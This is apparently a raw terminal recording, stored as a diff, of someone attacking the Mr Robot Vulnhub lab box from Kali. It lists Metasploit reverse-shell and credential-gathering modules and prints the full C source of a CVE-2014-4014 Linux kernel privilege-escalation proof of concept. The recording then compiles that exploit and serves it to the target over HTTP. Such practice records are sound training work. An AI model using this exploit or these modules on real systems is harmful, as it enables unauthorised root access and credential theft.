+   607  payload/[45mlinux[0m/mipsle/meterpreter_reverse_http                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   608  payload/[45mlinux[0m/mipsle/meterpreter_reverse_https                                             normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   609  payload/[45mlinux[0m/mipsle/meterpreter_reverse_tcp                                               normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   610  payload/[45mlinux[0m/mipsle/reboot                                                                normal     No     [45mLinux[0m Reboot
+   611  payload/[45mlinux[0m/mipsle/shell/reverse_tcp                                                     normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   612  payload/[45mlinux[0m/mipsle/shell_bind_tcp                                                        normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   613  payload/[45mlinux[0m/mipsle/shell_reverse_tcp                                                     normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   614  payload/[45mlinux[0m/ppc/meterpreter_reverse_http                                                 normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   615  payload/[45mlinux[0m/ppc/meterpreter_reverse_https                                                normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   616  payload/[45mlinux[0m/ppc/meterpreter_reverse_tcp                                                  normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   617  payload/[45mlinux[0m/ppc/shell_bind_tcp                                                           normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   618  payload/[45mlinux[0m/ppc/shell_find_port                                                          normal     No     [45mLinux[0m Command Shell, Find Port Inline
+   619  payload/[45mlinux[0m/ppc/shell_reverse_tcp                                                        normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   620  payload/[45mlinux[0m/ppc64/shell_bind_tcp                                                         normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   621  payload/[45mlinux[0m/ppc64/shell_find_port                                                        normal     No     [45mLinux[0m Command Shell, Find Port Inline
+   622  payload/[45mlinux[0m/ppc64/shell_reverse_tcp                                                      normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   623  payload/[45mlinux[0m/ppc64le/meterpreter_reverse_http                                             normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   624  payload/[45mlinux[0m/ppc64le/meterpreter_reverse_https                                            normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   625  payload/[45mlinux[0m/ppc64le/meterpreter_reverse_tcp                                              normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   626  payload/[45mlinux[0m/ppce500v2/meterpreter_reverse_http                                           normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   627  payload/[45mlinux[0m/ppce500v2/meterpreter_reverse_https                                          normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   628  payload/[45mlinux[0m/ppce500v2/meterpreter_reverse_tcp                                            normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   629  payload/[45mlinux[0m/x64/exec                                                                     normal     No     [45mLinux[0m Execute Command
+   630  payload/[45mlinux[0m/x64/meterpreter/bind_tcp                                                     normal     No     [45mLinux[0m Mettle x64, Bind TCP Stager
+   631  payload/[45mlinux[0m/x64/meterpreter/reverse_tcp                                                  normal     No     [45mLinux[0m Mettle x64, Reverse TCP Stager
+   632  payload/[45mlinux[0m/x64/meterpreter_reverse_http                                                 normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   633  payload/[45mlinux[0m/x64/meterpreter_reverse_https                                                normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   634  payload/[45mlinux[0m/x64/meterpreter_reverse_tcp                                                  normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   635  payload/[45mlinux[0m/x64/pingback_bind_tcp                                                        normal     No     [45mLinux[0m x64 Pingback, Bind TCP Inline
+   636  payload/[45mlinux[0m/x64/pingback_reverse_tcp                                                     normal     No     [45mLinux[0m x64 Pingback, Reverse TCP Inline
+   637  payload/[45mlinux[0m/x64/shell/bind_tcp                                                           normal     No     [45mLinux[0m Command Shell, Bind TCP Stager
+   638  payload/[45mlinux[0m/x64/shell/reverse_tcp                                                        normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   639  payload/[45mlinux[0m/x64/shell_bind_ipv6_tcp                                                      normal     No     [45mLinux[0m x64 Command Shell, Bind TCP Inline (IPv6)
+   640  payload/[45mlinux[0m/x64/shell_bind_tcp                                                           normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   641  payload/[45mlinux[0m/x64/shell_bind_tcp_random_port                                               normal     No     [45mLinux[0m Command Shell, Bind TCP Random Port Inline
+   642  payload/[45mlinux[0m/x64/shell_find_port                                                          normal     No     [45mLinux[0m Command Shell, Find Port Inline
+   643  payload/[45mlinux[0m/x64/shell_reverse_ipv6_tcp                                                   normal     No     [45mLinux[0m x64 Command Shell, Reverse TCP Inline (IPv6)
+   644  payload/[45mlinux[0m/x64/shell_reverse_tcp                                                        normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   645  payload/[45mlinux[0m/x86/adduser                                                                  normal     No     [45mLinux[0m Add User
+   646  payload/[45mlinux[0m/x86/chmod                                                                    normal     No     [45mLinux[0m Chmod
+   647  payload/[45mlinux[0m/x86/exec                                                                     normal     No     [45mLinux[0m Execute Command
+   648  payload/[45mlinux[0m/x86/meterpreter/bind_ipv6_tcp                                                normal     No     [45m[45mLinux[0m[0m Mettle x86, Bind IPv6 TCP Stager ([45m[45mLinux[0m[0m x86)
+   649  payload/[45mlinux[0m/x86/meterpreter/bind_ipv6_tcp_uuid                                           normal     No     [45m[45mLinux[0m[0m Mettle x86, Bind IPv6 TCP Stager with UUID Support ([45m[45mLinux[0m[0m x86)
+   650  payload/[45mlinux[0m/x86/meterpreter/bind_nonx_tcp                                                normal     No     [45mLinux[0m Mettle x86, Bind TCP Stager
+   651  payload/[45mlinux[0m/x86/meterpreter/bind_tcp                                                     normal     No     [45m[45mLinux[0m[0m Mettle x86, Bind TCP Stager ([45m[45mLinux[0m[0m x86)
+   652  payload/[45mlinux[0m/x86/meterpreter/bind_tcp_uuid                                                normal     No     [45m[45mLinux[0m[0m Mettle x86, Bind TCP Stager with UUID Support ([45m[45mLinux[0m[0m x86)
+   653  payload/[45mlinux[0m/x86/meterpreter/find_tag                                                     normal     No     [45mLinux[0m Mettle x86, Find Tag Stager
+   654  payload/[45mlinux[0m/x86/meterpreter/reverse_ipv6_tcp                                             normal     No     [45mLinux[0m Mettle x86, Reverse TCP Stager (IPv6)
+   655  payload/[45mlinux[0m/x86/meterpreter/reverse_nonx_tcp                                             normal     No     [45mLinux[0m Mettle x86, Reverse TCP Stager
+   656  payload/[45mlinux[0m/x86/meterpreter/reverse_tcp                                                  normal     No     [45mLinux[0m Mettle x86, Reverse TCP Stager
+   657  payload/[45mlinux[0m/x86/meterpreter/reverse_tcp_uuid                                             normal     No     [45mLinux[0m Mettle x86, Reverse TCP Stager
+   658  payload/[45mlinux[0m/x86/meterpreter_reverse_http                                                 normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   659  payload/[45mlinux[0m/x86/meterpreter_reverse_https                                                normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   660  payload/[45mlinux[0m/x86/meterpreter_reverse_tcp                                                  normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   661  payload/[45mlinux[0m/x86/metsvc_bind_tcp                                                          normal     No     [45mLinux[0m Meterpreter Service, Bind TCP
+   662  payload/[45mlinux[0m/x86/metsvc_reverse_tcp                                                       normal     No     [45mLinux[0m Meterpreter Service, Reverse TCP Inline
+   663  payload/[45mlinux[0m/x86/read_file                                                                normal     No     [45mLinux[0m Read File
+   664  payload/[45mlinux[0m/x86/shell/bind_ipv6_tcp                                                      normal     No     [45m[45mLinux[0m[0m Command Shell, Bind IPv6 TCP Stager ([45m[45mLinux[0m[0m x86)
+   665  payload/[45mlinux[0m/x86/shell/bind_ipv6_tcp_uuid                                                 normal     No     [45m[45mLinux[0m[0m Command Shell, Bind IPv6 TCP Stager with UUID Support ([45m[45mLinux[0m[0m x86)
+   666  payload/[45mlinux[0m/x86/shell/bind_nonx_tcp                                                      normal     No     [45mLinux[0m Command Shell, Bind TCP Stager
+   667  payload/[45mlinux[0m/x86/shell/bind_tcp                                                           normal     No     [45m[45mLinux[0m[0m Command Shell, Bind TCP Stager ([45m[45mLinux[0m[0m x86)
+   668  payload/[45mlinux[0m/x86/shell/bind_tcp_uuid                                                      normal     No     [45m[45mLinux[0m[0m Command Shell, Bind TCP Stager with UUID Support ([45m[45mLinux[0m[0m x86)
+   669  payload/[45mlinux[0m/x86/shell/find_tag                                                           normal     No     [45mLinux[0m Command Shell, Find Tag Stager
+   670  payload/[45mlinux[0m/x86/shell/reverse_ipv6_tcp                                                   normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager (IPv6)
+   671  payload/[45mlinux[0m/x86/shell/reverse_nonx_tcp                                                   normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   672  payload/[45mlinux[0m/x86/shell/reverse_tcp                                                        normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   673  payload/[45mlinux[0m/x86/shell/reverse_tcp_uuid                                                   normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   674  payload/[45mlinux[0m/x86/shell_bind_ipv6_tcp                                                      normal     No     [45mLinux[0m Command Shell, Bind TCP Inline (IPv6)
+   675  payload/[45mlinux[0m/x86/shell_bind_tcp                                                           normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   676  payload/[45mlinux[0m/x86/shell_bind_tcp_random_port                                               normal     No     [45mLinux[0m Command Shell, Bind TCP Random Port Inline
+   677  payload/[45mlinux[0m/x86/shell_find_port                                                          normal     No     [45mLinux[0m Command Shell, Find Port Inline
+   678  payload/[45mlinux[0m/x86/shell_find_tag                                                           normal     No     [45mLinux[0m Command Shell, Find Tag Inline
+   679  payload/[45mlinux[0m/x86/shell_reverse_tcp                                                        normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   680  payload/[45mlinux[0m/x86/shell_reverse_tcp_ipv6                                                   normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline (IPv6)
+   681  payload/[45mlinux[0m/zarch/meterpreter_reverse_http                                               normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   682  payload/[45mlinux[0m/zarch/meterpreter_reverse_https                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   683  payload/[45mlinux[0m/zarch/meterpreter_reverse_tcp                                                normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   684  post/[45mlinux[0m/busybox/enum_connections                                                        normal     No     BusyBox Enumerate Connections
+   685  post/[45mlinux[0m/busybox/enum_hosts                                                              normal     No     BusyBox Enumerate Host Names
+   686  post/[45mlinux[0m/busybox/jailbreak                                                               normal     No     BusyBox Jailbreak
+   687  post/[45mlinux[0m/busybox/ping_net                                                                normal     No     BusyBox Ping Network Enumeration
+   688  post/[45mlinux[0m/busybox/set_dmz                                                                 normal     No     BusyBox DMZ Configuration
+   689  post/[45mlinux[0m/busybox/set_dns                                                                 normal     No     BusyBox DNS Configuration
+   690  post/[45mlinux[0m/busybox/smb_share_root                                                          normal     No     BusyBox SMB Sharing
+   691  post/[45mlinux[0m/busybox/wget_exec                                                               normal     No     BusyBox Download and Execute
+   692  post/[45mlinux[0m/dos/xen_420_dos                                                                 normal     No     [45mLinux[0m DoS Xen 4.2.0 2012-5525
+   693  post/[45mlinux[0m/gather/checkcontainer                                                           normal     No     [45mLinux[0m Gather Container Detection
+   694  post/[45mlinux[0m/gather/checkvm                                                                  normal     No     [45mLinux[0m Gather Virtual Environment Detection
+   695  post/[45mlinux[0m/gather/ecryptfs_creds                                                           normal     No     Gather eCryptfs Metadata
+   696  post/[45mlinux[0m/gather/enum_commands                                                            normal     No     Testing commands needed in a function
+   697  post/[45mlinux[0m/gather/enum_configs                                                             normal     No     [45mLinux[0m Gather Configurations
+   698  post/[45mlinux[0m/gather/enum_nagios_xi                                          2018-04-17       normal     No     Nagios XI Enumeration
+   699  post/[45mlinux[0m/gather/enum_network                                                             normal     No     [45mLinux[0m Gather Network Information
+   700  post/[45mlinux[0m/gather/enum_protections                                                         normal     No     [45mLinux[0m Gather Protection Enumeration
+   701  post/[45mlinux[0m/gather/enum_psk                                                                 normal     No     [45mLinux[0m Gather 802-11-Wireless-Security Credentials
+   702  post/[45mlinux[0m/gather/enum_system                                                              normal     No     [45mLinux[0m Gather System and User Information
+   703  post/[45mlinux[0m/gather/enum_users_history                                                       normal     No     [45mLinux[0m Gather User History
+   704  post/[45mlinux[0m/gather/gnome_commander_creds                                                    normal     No     [45mLinux[0m Gather Gnome-Commander Creds
+   705  post/[45mlinux[0m/gather/gnome_keyring_dump                                                       normal     No     Gnome-Keyring Dump
+   706  post/[45mlinux[0m/gather/hashdump                                                                 normal     No     [45m[45mLinux[0m[0m Gather Dump Password Hashes for [45m[45mLinux[0m[0m Systems
+   707  post/[45mlinux[0m/gather/mount_cifs_creds                                                         normal     No     [45mLinux[0m Gather Saved mount.cifs/mount.smbfs Credentials
+   708  post/[45mlinux[0m/gather/openvpn_credentials                                                      normal     No     OpenVPN Gather Credentials
+   709  post/[45mlinux[0m/gather/phpmyadmin_credsteal                                                     normal     No     Phpmyadmin credentials stealer
+   710  post/[45mlinux[0m/gather/pptpd_chap_secrets                                                       normal     No     [45mLinux[0m Gather PPTP VPN chap-secrets Credentials
+   711  post/[45mlinux[0m/gather/tor_hiddenservices                                                       normal     No     [45mLinux[0m Gather TOR Hidden Services
+   712  post/[45mlinux[0m/manage/dns_spoofing                                                             normal     No     Native DNS Spoofing module
+   713  post/[45mlinux[0m/manage/download_exec                                                            normal     No     [45mLinux[0m Manage Download and Execute
+   714  post/[45mlinux[0m/manage/iptables_removal                                                         normal     No     IPTABLES rules removal
+   715  post/[45mlinux[0m/manage/pseudo_shell                                                             normal     No     Pseudo-Shell Post-Exploitation Module
+   716  post/[45mlinux[0m/manage/sshkey_persistence                                                       [32mexcellent[0m  No     SSH Key Persistence
+   717  post/multi/gather/enum_hexchat                                                             normal     No     [45mLinux[0m Gather HexChat/XChat Enumeration
+   718  post/multi/manage/play_youtube                                                             normal     No     Multi Manage YouTube Broadcast
+   719  post/multi/manage/shell_to_meterpreter                                                     normal     No     Shell to Meterpreter Upgrade
+   720  post/multi/manage/sudo                                                                     normal     No     Multiple [45mLinux[0m / Unix Post Sudo Upgrade Shell
+   721  post/multi/manage/zip                                                                      normal     No     Multi Manage File Compressor
+   722  post/windows/escalate/ms10_073_kbdlayout                                  2010-10-12       normal     No     Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation
+   723  post/windows/gather/screen_spy                                                             normal     No     Windows Gather Screen Spy
+   724  post/windows/manage/driver_loader                                                          normal     No     Windows Manage Driver Loader
+   725  post/windows/manage/pxeexploit                                                             normal     No     Windows Manage PXE Exploit Server
+
+
+Interact with a module by name or index, for example [32muse 725[0m or [32muse post/windows/manage/pxeexploit[0m
+
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> exit
+[0m]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# cle[K[K[Kls
+33824.c                             dirb-2       hydra           mrrobot2.txt  nmap       [0m[01;34mphp-reverse-shell[0m            usuario.txt  wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2     [01;35mreverse-shell-wordpress.png[0m  wpscan       wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3     robots.txt                   wpscan-2
+dirb                                hash         license         nikto-2       notes.txt  searchsploit                 wpscan-3
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# cat w[K33824.c 
+/**
+ * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC
+ *
+ * Vitaly Nikolenko
+ * http://hashcrack.org
+ *
+ * Usage: ./poc [file_path]
+ * 
+ * where file_path is the file on which you want to set the sgid bit
+ */
+#define _GNU_SOURCE
+#include <sys/wait.h>
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <string.h>
+#include <assert.h>
+
+#define STACK_SIZE (1024 * 1024)
+static char child_stack[STACK_SIZE];
+
+struct args {
+    int pipe_fd[2];
+    char *file_path;
+};
+
+static int child(void *arg) {
+    struct args *f_args = (struct args *)arg;
+    char c;
+
+    // close stdout
+    close(f_args->pipe_fd[1]); 
+
+    assert(read(f_args->pipe_fd[0], &c, 1) == 0);
+
+    // set the setgid bit
+    chmod(f_args->file_path, S_ISGID|S_IRUSR|S_IWUSR|S_IRGRP|S_IXGRP|S_IXUSR);
+
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    int fd;
+    pid_t pid;
+    char mapping[1024];
+    char map_file[PATH_MAX];
+    struct args f_args;
+
+    assert(argc == 2);
+
+    f_args.file_path = argv[1];
+    // create a pipe for synching the child and parent
+    assert(pipe(f_args.pipe_fd) != -1);
+
+    pid = clone(child, child_stack + STACK_SIZE, CLONE_NEWUSER | SIGCHLD, &f_args);
+    assert(pid != -1);
+
+    // get the current uid outside the namespace
+    snprintf(mapping, 1024, "0 %d 1\n", getuid()); 
+
+    // update uid and gid maps in the child
+    snprintf(map_file, PATH_MAX, "/proc/%ld/uid_map", (long) pid);
+    fd = open(map_file, O_RDWR); assert(fd != -1);
+
+    assert(write(fd, mapping, strlen(mapping)) == strlen(mapping));
+    close(f_args.pipe_fd[1]);
+
+    assert (waitpid(pid, NULL, 0) != -1);
+}]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls[K[Kgcc -[K33824.c -o xpl
+[01m[K33824.c:[m[K In function ‘[01m[Kchild[m[K’:
+[01m[K33824.c:40:5:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kchmod[m[K’ [[01;35m[K-Wimplicit-function-declaration[m[K]
+   40 |     [01;35m[Kchmod[m[K(f_args->file_path, S_ISGID|S_IRUSR|S_IWUSR|S_IRGRP|S_IXGRP|S_IXUSR);
+      |     [01;35m[K^~~~~[m[K
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls
+33824.c                             dirb-2       hydra           mrrobot2.txt  nmap       [0m[01;34mphp-reverse-shell[0m            usuario.txt  wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2     [01;35mreverse-shell-wordpress.png[0m  wpscan       wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3     robots.txt                   wpscan-2     [01;32mxpl[0m
+dirb                                hash         license         nikto-2       notes.txt  searchsploit                 wpscan-3
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# wget [K[K[K[K[K
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+192.168.0.28 - - [27/Oct/2020 16:22:48] "GET /xpl HTTP/1.1" 200 -
+^CTraceback (most recent call last):
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
+    "__main__", fname, loader, pkg_name)
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
+    exec code in run_globals
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
+    test()
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
+    BaseHTTPServer.test(HandlerClass, ServerClass)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
+    httpd.serve_forever()
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
+    poll_interval)
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
+    return func(*args)
+KeyboardInterrupt
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# nano xpl 
+[?2004h[?1049h[22;0;0t[1;39r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[37;77H(B[0;7m[ Reading... ](B[m[37;76H(B[0;7m[ Read 6 lines ](B[m[H(B[0;7m  GNU nano 4.9.3                                                                    xpl                                                                               [1;165H(B[m[38d(B[0;7m^G(B[m Get Help     (B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut Text     (B[0;7m^J(B[m Justify[81G(B[0;7m^C(B[m Cur Pos[97G(B[0;7mM-U(B[m Undo[38;113H(B[0;7mM-A(B[m Mark Text   (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[39d(B[0;7m^X(B[m Exit[39;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste Text   (B[0;7m^T(B[m To Spell     (B[0;7m^_(B[m Go To Line   (B[0;7mM-E(B[m Redo[39;113H(B[0;7mM-6(B[m Copy Text   (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[37d[2d[39;49m(B[m^?ELF^B^A^A^@^@^@^@^@^@^@^@^@^C^@>^@^A^@^@^@^@^Q^@^@^@^@^@^@@^@^@^@^@^@^@^@@<^@^@^@^@^@^@^@^@^@^@@^@8^@^K^@@^@^^^@^]^@^F^@^@^@^D^@^@^@@^@^@^@^@^@^@^@@^@^@^@^@^@^@^@@(B[0;7m>[3;1H(B[m^@^@^@^@^@^@^@^@^@^@^@`@^@^@^@^@^@^@^G^@^@^@^M^@^@^@^@^@^@^@^@^@^@^@h@^@^@^@^@^@^@^G^@^@^@^N^@^@^@^@^@^@^@^@^@^@^@p@^@^@^@^@^@^@^G^@^@^@^O^@^@^@^@^@^@^@^@^@^@^@^@^@^(B[0;7m>[4;1H(B[m^@^@^@�@����%�/^@^@h^K^@^@^@�0����%^B/^@^@f�^@^@^@^@^@^@^@^@1�I��^H��H���PTL�^E�^C^@^@H�^Mc^C^@^@H�=A^A^@^@�^U�.^@^@�^O^_D^@^@H�=Q/^@^@H�^EJ/^@^@H9�t^UH�^E�.^@^@H��t(B[0;7m>[5;1H(B[m^@/proc/%ld/uid_map^@fd != -1^@^@write(fd, mapping, strlen(mapping)) == strlen(mapping)^@waitpid(pid, NULL, 0) != -1^@child^@main^@^@^@^A^[^C;D^@^@^@^G^@^@^@8����^@^(B[0;7m>[6;1H(B[m^@^@^@^@^@^@^@�^@^@^@^@^@^@^@^K^@^@^@^@^@^@^@^X^@^@^@^@^@^@^@^U^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^@^@^@^@^@^@^@@^@^@^@^@^@^@^B^@^@^@^@^@^@^@ ^A^@^@^@^@^@^@^T^@^@^@^@(B[0;7m>[7;1H(B[m^@�^F^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^K^@^@^P^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^L^@ ^P^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^M^@�^P^@^@^@^@^@^@^@^@^@(B[0;7m>[2;1H(B[m[?12l[?25h[?25l[37d[J[39d[?12l[?25h[39;1H[?1049l[23;0;0t[?1l>[?2004l]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# nano 33824.c 
+[?2004h[?1049h[22;0;0t[1;39r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[37;77H(B[0;7m[ Reading... ](B[m[37;61H(B[0;7m[ Read 72 lines (Converted from DOS format) ](B[m[H(B[0;7m  GNU nano 4.9.3                                                                  33824.c                                                                             [1;165H(B[m[38d(B[0;7m^G(B[m Get Help     (B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut Text     (B[0;7m^J(B[m Justify[81G(B[0;7m^C(B[m Cur Pos[97G(B[0;7mM-U(B[m Undo[38;113H(B[0;7mM-A(B[m Mark Text   (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[39d(B[0;7m^X(B[m Exit[39;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste Text   (B[0;7m^T(B[m To Spell     (B[0;7m^_(B[m Go To Line   (B[0;7mM-E(B[m Redo[39;113H(B[0;7mM-6(B[m Copy Text   (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[37d[2d(B[0;1m[34m/**[3d * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC[4d *[5d * Vitaly Nikolenko[6d * http://hashcrack.org[7d *[8d * Usage: ./poc [file_path][9d *(B[0m[42m [10d(B[0;1m[34m * where file_path is the file on which you want to set the sgid bit[11d */[12d[36m#define[39m(B[m (B[0;1m[31m_GNU_SOURCE[13d[36m#include[33m <sys/wait.h>[14d[36m#include[33m <sched.h>[15d[36m#include[33m <stdio.h>[16d[36m#include[33m <stdlib.h>[17d[36m#include[33m <unistd.h>[18d[36m#include[33m <fcntl.h>[19d[36m#include[33m <limits.h>[20d[36m#include[33m <string.h>[21d[36m#include[33m <assert.h>[23d[36m#define[39m(B[m (B[0;1m[31mSTACK_SIZE[39m(B[m (1024 * 1024)[24d[32mstatic[39m(B[m [32mchar[39m(B[m child_stack[(B[0;1m[31mSTACK_SIZE[39m(B[m];[26d[32mstruct[39m(B[m args {[27;5H[32mint[39m(B[m pipe_fd[2];[28;5H[32mchar[39m(B[m *file_path;[29d};[31d[32mstatic[39m(B[m [32mint[39m(B[m child([32mvoid[39m(B[m *arg) {[32;5H[32mstruct[39m(B[m args *f_args = ([32mstruct[39m(B[m args *)arg;[33;5H[32mchar[39m(B[m c;[35;5H(B[0;1m[34m// close stdout[36;5H[39m(B[mclose(f_args->pipe_fd[1]);[42m [2d[49m(B[m[?12l[?25h[?25l[?12l[?25h[?25l[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[6d[?12l[?25h[?25l[7d[?12l[?25h[?25l[8d[?12l[?25h[?25l[9d[?12l[?25h[?25l[10d[?12l[?25h[?25l[11d[?12l[?25h[?25l[12d[?12l[?25h[?25l[13d[?12l[?25h[?25l[14d[?12l[?25h[?25l[15d[?12l[?25h[?25l[16d[?12l[?25h[?25l[17d[?12l[?25h[?25l[18d[?12l[?25h[?25l[19d[?12l[?25h[?25l[20d[?12l[?25h[?25l[21d[?12l[?25h[?25l[22d[?12l[?25h[?25l[23d[?12l[?25h[?25l[24d[?12l[?25h[?25l[25d[?12l[?25h[?25l[26d[?12l[?25h[?25l[37d[K[27d[?12l[?25h[?25l[28d[?12l[?25h[?25l[29d[?12l[?25h[?25l[30d[?12l[?25h[?25l[31d[?12l[?25h[?25l[32d[?12l[?25h[?25l[33d[?12l[?25h[?25l[34d[?12l[?25h[?25l[35d[?12l[?25h[?25l[36d[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert(read(f_args->pipe_fd[0], &c, 1) == 0);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H(B[0;1m[34m// set the setgid bit[39m(B[m[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hchmod(f_args->file_path, (B[0;1m[31mS_ISGID[39m(B[m|(B[0;1m[31mS_IRUSR[39m(B[m|(B[0;1m[31mS_IWUSR[39m(B[m|(B[0;1m[31mS_IRGRP[39m(B[m|(B[0;1m[31mS_IXGRP[39m(B[m|(B[0;1m[31mS_IXUSR[39m(B[m);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H[35mreturn[39m(B[m 0;[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H}[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[32mint[39m(B[m main([32mint[39m(B[m argc, [32mchar[39m(B[m *argv[]) {[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H[32mint[39m(B[m fd;[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H[32mpid_t[39m(B[m pid;[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H[32mchar[39m(B[m mapping[1024];[?12l[?25h[?25l7[2;37r8[37d
